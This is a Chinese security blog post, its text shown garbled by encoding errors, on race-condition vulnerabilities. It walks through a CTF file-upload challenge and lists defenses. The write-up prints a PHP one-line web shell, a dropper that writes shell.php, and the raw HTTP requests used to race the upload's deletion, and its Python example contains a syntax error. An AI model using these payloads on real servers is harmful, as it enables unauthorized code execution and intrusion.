<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        
            æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹  | zer0ptr&#39;s Blog
        
    </title>
    
    <!-- Meta tags -->
    <meta name="description" content="">
    <meta name="author" content="zer0ptr">
    
    <!-- å…³é”®CSSå†…è” -->
    <style>
        /* å…³é”®æ¸²æŸ“è·¯å¾„CSS */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            line-height: 1.6; color: #333; background-color: #fff; font-size: 17px; overflow-x: hidden;
        }
        .container { max-width: 650px; margin: 0 auto; padding: 0 15px; }
        .loading-indicator {
            position: fixed; top: 0; left: 0; width: 100%; height: 3px;
            background: linear-gradient(90deg, #007acc, #4fc3f7);
            transform: translateX(-100%); transition: transform 0.3s ease; z-index: 9999;
        }
        .loading-indicator.active { animation: loadingProgress 1s ease-in-out infinite; }
        @keyframes loadingProgress {
            0% { transform: translateX(-100%); }
            50% { transform: translateX(0%); }
            100% { transform: translateX(100%); }
        }
    </style>
    
    <!-- å¼‚æ­¥åŠ è½½å®Œæ•´CSS -->
    <link rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
    
    <!-- CSSåŠ è½½polyfill -->
    <script>
        // ç¡®ä¿CSSå¼‚æ­¥åŠ è½½åœ¨æ‰€æœ‰æµè§ˆå™¨ä¸­æ­£å¸¸å·¥ä½œ
        !function(e){"use strict";var t=function(t,n,r){function o(e){return i.body?e():void setTimeout(function(){o(e)})}function a(){d.addEventListener&&d.removeEventListener("load",a),d.media=r||"all"}var i=e.document,d=i.createElement("link");if(n)d.id=n;d.rel="stylesheet",d.href=t,d.media="only x",o(function(){i.head.appendChild(d)}),setTimeout(a);return d};e.loadCSS=t}(this);
    </script>
    
    <!-- é¢„åŠ è½½å…³é”®èµ„æº -->
    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
    <link rel="preconnect" href="https://cdn.jsdelivr.net">
    
    <!-- æŒ‰éœ€åŠ è½½Highlight.js CSS -->
    
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
    
    
    <!-- æŒ‰éœ€åŠ è½½MathJax -->
    
        <script>
            window.MathJax = {
                tex: {
                    inlineMath: [['$', '$'], ['\\(', '\\)']],
                    displayMath: [['$$', '$$'], ['\\[', '\\]']],
                    processEscapes: true,
                    processEnvironments: true
                },
                options: {
                    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
                }
            };
        </script>
        <script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
    
    
    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
    
    <!-- é¢„åŠ è½½JavaScript -->
    <link rel="preload" href="/js/search.js" as="script">
    <link rel="preload" href="/js/script.js" as="script">
<meta name="generator" content="Hexo 7.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head>
<body>
    <!-- åŠ è½½æŒ‡ç¤ºå™¨ -->
    <div class="loading-indicator" id="loadingIndicator"></div>
    <!-- Top Navigation Bar -->
    
    <nav class="top-navigation">
        <div class="container">
            <div class="nav-brand">
                <a href="/" class="nav-brand-link">
                    zer0ptr&#39;s blog
                </a>
            </div>
            <ul class="top-nav-list">
                
                    <li class="top-nav-item">
                        <a href="/archives" class="top-nav-link">
                            Archives
                        </a>
                    </li>
                
                    <li class="top-nav-item">
                        <a href="/categories" class="top-nav-link">
                            Categories
                        </a>
                    </li>
                
                    <li class="top-nav-item">
                        <a href="/tags" class="top-nav-link">
                            Tags
                        </a>
                    </li>
                
                    <li class="top-nav-item">
                        <a href="/about" class="top-nav-link">
                            About
                        </a>
                    </li>
                
                <li class="top-nav-item">
                    <a href="https://github.com" class="top-nav-link" target="_blank">
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                            <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
                        </svg>
                    </a>
                </li>
                <li class="top-nav-item">
                    <a href="#" class="top-nav-link search-toggle">
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                            <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
                        </svg>
                    </a>
                </li>
            </ul>
        </div>
    </nav>
    
    
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="header-content">
                <h1 class="site-title">
                    <a href="/">
                        zer0ptr&#39;s blog
                    </a>
                </h1>
                
                    <p class="site-subtitle">
                        Walking on my wayğŸ§.
                    </p>
                
            </div>
        </header>

        <!-- Main Content -->
        <main class="main-content page-transition" id="mainContent">
            <article class="post">
    <!-- Post Header -->
    <header class="post-header">
        
            <div class="post-meta">
                
                    <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-link">
                        Webå®‰å…¨
                    </a>
                
            </div>
        
        
        <h1 class="post-title">æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹ </h1>
        
        <div class="post-info">
            <time class="post-date" datetime="2025-02-08T09:02:24.000Z">
                February 08, 2025
            </time>
            
            
            
            
        </div>
        
        
            <div class="post-tags">
                
                    <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="tag-link">
                        #Webå®‰å…¨
                    </a>
                
            </div>
        
    </header>
    
    <!-- Post Content -->
    <div class="post-content">
        <h2 id="Webå®‰å…¨æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹ "><a href="#Webå®‰å…¨æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹ " class="headerlink" title="Webå®‰å…¨æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹ "></a>Webå®‰å…¨æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹ </h2><h4 id="0x00-æ¦‚è¿°"><a href="#0x00-æ¦‚è¿°" class="headerlink" title="0x00 æ¦‚è¿°"></a>0x00 æ¦‚è¿°</h4><p>â€‹		æ¡ä»¶ç«äº‰æ¼æ´å‘ç”Ÿåœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«ä»£ç ã€å˜é‡ã€æ–‡ä»¶ç­‰ï¼Œï¼Œç”±äºå¤šä¸ªä¸åŒçº¿ç¨‹åŒæ—¶ä¸ç›¸åŒçš„æ•°æ®è¿›è¡Œäº¤äº’ï¼Œä»è€Œå¯¼è‡´ç¢°æ’å†²çªï¼ˆä¾‹å¦‚ï¼Œåç«¯å¤šä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹æ•°æ®åº“ä¸­çš„æŸä¸€ä¸ªå­—æ®µå€¼ï¼‰ã€‚æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒå®šåˆ¶è¯·æ±‚åˆ°è¾¾åç«¯çš„æ—¶é—´æ•…æ„åˆ¶é€ å†²çªï¼Œå¹¶ç”±æ­¤å®ç°æ¶æ„ç›®çš„ã€‚è¿™ä¸ªæ¼æ´å­˜åœ¨äºæ“ä½œç³»ç»Ÿã€æ•°æ®åº“ã€webç­‰å¤šä¸ªå±‚é¢ï¼Œç”±äºå¤§å¤šæœåŠ¡ç«¯æ¡†æ¶åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œè€Œå¼€å‘è€…åœ¨è¿›è¡Œä»£ç å¼€å‘æ—¶å¸¸å¸¸å€¾å‘äºè®¤ä¸ºä»£ç ä¼šä»¥çº¿æ€§çš„æ–¹å¼æ‰§è¡Œï¼Œè€Œå¿½è§†äº†å¹¶è¡ŒæœåŠ¡å™¨ä¼šå¹¶å‘æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œè¿™å°±ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ç»“æœã€‚</p>
<h6 id="ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¤šçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ²¡æœ‰å¯¹å¯¹è±¡è¿›è¡ŒåŠ é”ç­‰ä¿è¯ä¸€è‡´æ€§çš„æ“ä½œ"><a href="#ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¤šçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ²¡æœ‰å¯¹å¯¹è±¡è¿›è¡ŒåŠ é”ç­‰ä¿è¯ä¸€è‡´æ€§çš„æ“ä½œ" class="headerlink" title="ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¤šçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ²¡æœ‰å¯¹å¯¹è±¡è¿›è¡ŒåŠ é”ç­‰ä¿è¯ä¸€è‡´æ€§çš„æ“ä½œ"></a>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¤šçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ²¡æœ‰å¯¹å¯¹è±¡è¿›è¡ŒåŠ é”ç­‰ä¿è¯ä¸€è‡´æ€§çš„æ“ä½œ</h6><h4 id="0x01-ç®€å•åˆ†æ"><a href="#0x01-ç®€å•åˆ†æ" class="headerlink" title="0x01 ç®€å•åˆ†æ"></a>0x01 ç®€å•åˆ†æ</h4><p>æˆ‘ä»¬æ¥è®¾è®¡ä¸€ä¸ªç®€ç­”çš„ä¸šåŠ¡é€»è¾‘ï¼šå•†åŸç³»ç»Ÿä¸­ï¼Œç”¨æˆ·æäº¤æŠ˜æ‰£ç ï¼Œåç«¯ä¼šæ£€æµ‹ç”¨æˆ·æ˜¯å¦å·²ç»ä½¿ç”¨è¿‡æŠ˜æ‰£ç ã€‚è‹¥æœªä½¿ç”¨è¿‡ï¼Œåˆ™ä½¿ç”¨è¯¥æŠ˜æ‰£ç ï¼Œå¹¶è®°å½•æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€ä¸ºTrueã€‚è‹¥å·²ä½¿ç”¨æŠ˜æ‰£ç ï¼Œç”¨æˆ·å†æ¬¡ä½¿ç”¨æŠ˜æ‰£ç æ—¶ï¼Œåç«¯ç¨‹åºè¯»å–æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€ä¸ºTrueï¼Œæ‹’ç»ç”¨æˆ·å†æ¬¡ä½¿ç”¨æŠ˜æ‰£ç ã€‚</p>
<p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" alt="Lesson-eb3846115f6b8"></p>
<p>æˆ‘ä»¬åœ¨è¿™é‡Œç”¨ä¸€æ®µç®€å•çš„pythonä»£ç æ¥æ¨¡æ‹Ÿåç«¯é€»è¾‘ï¼Œå¤„ç†è¯·æ±‚çš„<code>handle_req()</code>å‡½æ•°æ˜¯å¹¶å‘ï¼ˆå¤šçº¿ç¨‹&#x2F;å¤šè¿›ç¨‹ï¼‰æ‰§è¡Œçš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> **handle_req**():</span><br><span class="line">    <span class="keyword">if</span> code_already_used = <span class="literal">False</span>: <span class="comment"># åˆ¤æ–­å¦‚æœæ²¡æœ‰ä½¿ç”¨è¿‡æŠ˜æ‰£ç ï¼ˆå®é™…åº”è¯¥æ˜¯å¯¹æ•°æ®åº“çš„æŸ¥è¯¢ï¼Œæ­¤å¤„ç®€åŒ–å†™æ³•ï¼‰</span></span><br><span class="line">        use_code()				  <span class="comment"># ä½¿ç”¨æŠ˜æ‰£ç ï¼Œå¯¹å•†å“è¿›è¡Œæ‰“æŠ˜</span></span><br><span class="line">        code_already_used = <span class="literal">True</span>  <span class="comment"># ä½¿ç”¨è¿‡æŠ˜æ‰£ç åï¼Œå°†æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€ä¸ºTrueï¼ˆå®é™…åº”è¯¥æ˜¯å¯¹æ•°æ®åº“çš„æ•°æ®æ›´æ–°ï¼Œæ­¤å¤„ç®€åŒ–å†™æ³•ï¼‰</span></span><br><span class="line">    <span class="keyword">else</span>:						  <span class="comment"># è‹¥å·²ç»ä½¿ç”¨è¿‡æŠ˜æ‰£ç </span></span><br><span class="line">        reject_use_code()      	  <span class="comment"># æ‹’ç»å†æ¬¡ä½¿ç”¨æŠ˜æ‰£ç </span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ä¸ªè¿‡ç¨‹å¯èƒ½ä¼šå­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå› ä¸ºæˆ‘ä»¬ç¬¬ä¸€æ¬¡è¯·æ±‚åˆ¤æ–­çš„çŠ¶æ€ä¸ºfalseå³æœªä½¿ç”¨æŠ˜æ‰£ç ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªè¯·æ±‚æ‰§è¡Œåˆ°ç¬¬å››è¡Œæ—¶å‡†å¤‡æ›´æ–°æ•°æ®åº“å†…å®¹è€Œç¬¬äºŒä¸ªè¯·æ±‚åˆå¼€å§‹æ‰§è¡Œå¹¶å°†æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€å†ä¸€æ¬¡åœ°æ ‡è®°ä¸ºfalseï¼Œä»è€Œé€ æˆäº†ä½¿ç”¨äº†ä¸¤æ¬¡æŠ˜æ‰£ç ï¼Œè§¦å‘äº†æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šåç«¯å°†è®°å½•æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€ä¸ºTrueä¹‹å‰ï¼Œå¯èƒ½å­˜åœ¨æ¡ä»¶ç«äº‰ï¼Œä¸Šè¿°ç¬¬2ã€3è¡Œä»£ç æ‰§è¡Œçš„æ—¶é—´å°±æ˜¯<code>ç«äº‰çª—å£</code>ã€‚</p>
<p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" alt="Lesson-eb3846115f6b8"></p>
<p>ã€€ç«äº‰çª—å£ä¸€èˆ¬æ˜¯ä¸€æ®µå¾ˆçŸ­çš„æ—¶é—´æ®µï¼ˆå‡ æ¯«ç§’ç”šè‡³æ›´çŸ­ï¼‰ï¼Œç”¨æˆ·é€šè¿‡å¹¶è¡Œå‘é€å¤šä¸ªæ•°æ®åŒ…ï¼Œä½¿å¾—æœåŠ¡ç«¯ç«äº‰çª—å£å†…æ‰§è¡Œå¤šæ¬¡ç‰¹å®šçš„åŠŸèƒ½ã€‚</p>
<p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" alt="Lesson-eb3846115f6b8"></p>
<h4 id="0x02-CTFä¸­çš„æ¡ä»¶ç«äº‰"><a href="#0x02-CTFä¸­çš„æ¡ä»¶ç«äº‰" class="headerlink" title="0x02 CTFä¸­çš„æ¡ä»¶ç«äº‰"></a>0x02 CTFä¸­çš„æ¡ä»¶ç«äº‰</h4><p>æˆ‘ä»¬æ¥çœ‹è¿™æ ·çš„ä¸€é“é¢˜ç›®</p>
<p>ã€é¢˜å‹ã€‘<a href="">Web</a><br>ã€é¢˜ç›®ã€‘<code>wzsc_æ–‡ä»¶ä¸Šä¼ </code><br>ã€æ¥æºã€‘ï¼ˆ[æ”»é˜²ä¸–ç•Œ](<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/listï¼‰</a><br>ã€æ€è·¯ã€‘<a href="">æ¡ä»¶ç«äº‰</a></p>
<p>æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å¹¶æŠŠåŒ…æ‹¦æˆªä¸‹æ¥è¿›è¡Œåˆ†ææµ‹è¯•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: Host:Port</span><br><span class="line">Content-Length: 230</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://61.147.171.105:56903</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLh</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: Host:Port</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryMwWBoiGSKcfAYxLh</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;classic.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æŠŠå®ƒæ”¾åˆ°Repeaterä¸­æ”¾å‡ºå»çœ‹çœ‹ï¼ŒæŸ¥çœ‹è¿”å›åŒ…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 08 Feb 2025 09:38:03 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„çŠ¶æ€ç æ˜¯200ï¼Œè¯æ˜æˆ‘ä»¬æ˜¯å¯ä»¥æˆåŠŸä¸Šä¼ ä½†æ˜¯åœ¨æœåŠ¡å™¨ä¸­è¢«åˆ é™¤äº†ï¼Œé‚£è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ€è·¯</p>
<p>æˆ‘ä»¬å…ˆå°è¯•è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„ä¸€å¥è¯å¹¶æ‹¦æˆªåŒ…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /upload/classic.php HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:56903</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>BurpSuite</code>ä¸­åŒæ—¶æ‹¦æˆªä¸‹è¿™ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œç„¶åå‘é€è‡³Intruderæ¨¡å—ï¼Œå°†payloadè®¾ç½®ä¸º<code>Null Payload</code>ï¼Œå¹¶å¼€å§‹æ”»å‡»ï¼Œè¿™æ ·æˆ‘ä»¬è¿˜éœ€è¦æ­é…ä¸Šè¿™æ ·çš„ä¸€å¥PHPä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å®ƒçš„ä½œç”¨æ˜¯åªè¦æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶èƒ½è¢«æˆåŠŸè®¿é—®ï¼Œå®ƒå°±èƒ½åœ¨æœåŠ¡å™¨ä¸Šæ–°å»ºä¸€ä¸ª<code>shell.php</code>å¹¶å°†ä¸€å¥è¯å†™å…¥ï¼Œä»è€Œä½¿æˆ‘ä»¬èƒ½å¤ŸæˆåŠŸ<code>getshel</code>l~</p>
<p>ç”¨ä¸¤ä¸ªä¸åŒçš„æ•°æ®åŒ…è®¾ç½®<code>Null Payload</code>çš„ä½œç”¨æ˜¯åˆ©ç”¨æˆ‘ä»¬æåˆ°çš„â€œç«äº‰çª—å£â€å³ä¸Šä¼ æˆåŠŸåˆ°è¢«åˆ é™¤çš„è¿™ä¸€å°æ®µæ—¶é—´å»è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„å†…é¬¼è®©å…¶åœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªæ¥åº”æˆ‘ä»¬çš„shellï¼Œå…¶å®ç®€å•åœ°è¯´å°±æ˜¯ç”¨ä¸¤ä¸ªä¸åŒçš„æ“ä½œå»åŒæ—¶è¯»å†™ä¸€ä¸ªæ–‡ä»¶</p>
<p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" alt="4"></p>
<p>Success to uploadï¼</p>
<p>æˆåŠŸæ‹¿åˆ°flagï¼š<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p>
<h4 id="0x03-å¦‚ä½•é˜²å¾¡ï¼Ÿ"><a href="#0x03-å¦‚ä½•é˜²å¾¡ï¼Ÿ" class="headerlink" title="0x03 å¦‚ä½•é˜²å¾¡ï¼Ÿ"></a>0x03 å¦‚ä½•é˜²å¾¡ï¼Ÿ</h4><p>ä»¥ä¸‹æ€»ç»“äº†ä¸€äº›é˜²å¾¡æ–¹æ³•å’Œå¸¸è§æ¡ä»¶ç«äº‰æ¼æ´ç¤ºä¾‹åŠé˜²å¾¡</p>
<p>(1) ä½¿ç”¨åŒæ­¥æœºåˆ¶<br>    é”ï¼ˆLockï¼‰ï¼šé€šè¿‡åŠ é”ç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹æˆ–è¿›ç¨‹å¯ä»¥è®¿é—®å…±äº«èµ„æºã€‚<br>    ä¿¡å·é‡ï¼ˆSemaphoreï¼‰ï¼šé™åˆ¶åŒæ—¶è®¿é—®èµ„æºçš„çº¿ç¨‹æˆ–è¿›ç¨‹æ•°é‡ã€‚<br>    äº’æ–¥é‡ï¼ˆMutexï¼‰ï¼šç±»ä¼¼äºé”ï¼Œç”¨äºå¤šçº¿ç¨‹ç¯å¢ƒã€‚<br>(2) åŸå­æ“ä½œ<br>    ä½¿ç”¨åŸå­æ“ä½œç¡®ä¿æ“ä½œçš„ä¸å¯åˆ†å‰²æ€§ã€‚<br>    ç¤ºä¾‹ï¼š<br>        æ•°æ®åº“ä¸­çš„äº‹åŠ¡ï¼ˆTransactionï¼‰ã€‚<br>        ç¼–ç¨‹è¯­è¨€ä¸­çš„åŸå­ç±»å‹ï¼ˆå¦‚ atomic åœ¨ C++ æˆ– Java ä¸­ï¼‰ã€‚<br>(3) é¿å…å…±äº«èµ„æº<br>    å°½é‡å‡å°‘å…±äº«èµ„æºçš„ä½¿ç”¨ï¼Œé‡‡ç”¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆThread Local Storage, TLSï¼‰æˆ–è¿›ç¨‹éš”ç¦»ã€‚<br>    ç¤ºä¾‹ï¼š<br>        ä½¿ç”¨çº¿ç¨‹æœ¬åœ°å˜é‡ä»£æ›¿å…¨å±€å˜é‡ã€‚<br>(4) æ–‡ä»¶æ“ä½œé˜²å¾¡<br>    ä½¿ç”¨æ–‡ä»¶é”ï¼ˆFile Lockï¼‰ç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥è®¿é—®æ–‡ä»¶ã€‚<br>(5) æ•°æ®åº“æ“ä½œé˜²å¾¡<br>    ä½¿ç”¨äº‹åŠ¡ï¼ˆTransactionï¼‰å’Œé”æœºåˆ¶ï¼ˆå¦‚è¡Œé”ã€è¡¨é”ï¼‰ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚<br>(6) æ—¶é—´çª—å£æœ€å°åŒ–<br>    å‡å°‘ç«äº‰æ¡ä»¶çš„å‘ç”Ÿæ¦‚ç‡ï¼Œå°½é‡ç¼©çŸ­å…±äº«èµ„æºçš„è®¿é—®æ—¶é—´ã€‚<br>    ç¤ºä¾‹ï¼š<br>        åœ¨æ–‡ä»¶æ“ä½œä¸­ï¼Œå°½å¿«é‡Šæ”¾æ–‡ä»¶é”ã€‚<br>(7) ä½¿ç”¨ä¸å¯å˜å¯¹è±¡<br>    ä½¿ç”¨ä¸å¯å˜å¯¹è±¡ï¼ˆImmutable Objectsï¼‰é¿å…å…±äº«èµ„æºè¢«ä¿®æ”¹ã€‚<br>    ç¤ºä¾‹ï¼š<br>        åœ¨å‡½æ•°å¼ç¼–ç¨‹ä¸­ï¼Œå°½é‡ä½¿ç”¨ä¸å¯å˜æ•°æ®ç»“æ„ã€‚<br>(8) è¾“å…¥éªŒè¯å’Œè¾¹ç•Œæ£€æŸ¥<br>    å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯ï¼Œé¿å…æ¶æ„è¾“å…¥è§¦å‘ç«äº‰æ¡ä»¶ã€‚<br>    ç¤ºä¾‹ï¼š<br>        æ£€æŸ¥æ–‡ä»¶è·¯å¾„ã€ç”¨æˆ·æƒé™ç­‰ã€‚<br>(9) ä»£ç å®¡æŸ¥å’Œæµ‹è¯•<br>    é€šè¿‡ä»£ç å®¡æŸ¥å‘ç°æ½œåœ¨çš„ç«äº‰æ¡ä»¶ã€‚<br>    ä½¿ç”¨å‹åŠ›æµ‹è¯•å’Œå¹¶å‘æµ‹è¯•å·¥å…·ï¼ˆå¦‚ JMeterã€Locustï¼‰æ¨¡æ‹Ÿé«˜å¹¶å‘åœºæ™¯ã€‚</p>
<p>å¸¸è§æ¡ä»¶ç«äº‰æ¼æ´ç¤ºä¾‹åŠé˜²å¾¡<br>(1) TOCTOUï¼ˆTime-of-Check to Time-of-Useï¼‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">æ¼æ´æè¿°ï¼šåœ¨æ£€æŸ¥èµ„æºçŠ¶æ€å’Œä½¿ç”¨èµ„æºä¹‹é—´å­˜åœ¨æ—¶é—´çª—å£ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´çª—å£ä¿®æ”¹èµ„æºçŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line">é˜²å¾¡æ–¹æ³•ï¼š</span><br><span class="line"></span><br><span class="line">    ä½¿ç”¨åŸå­æ“ä½œï¼ˆå¦‚ open() çš„ O_EXCL æ ‡å¿—ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">    ç¤ºä¾‹ï¼ˆC è¯­è¨€ï¼‰ï¼š</span><br><span class="line">    c</span><br><span class="line">    å¤åˆ¶</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0644</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶å·²å­˜åœ¨</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>(2) æ–‡ä»¶ä¸Šä¼ æ¼æ´</p>
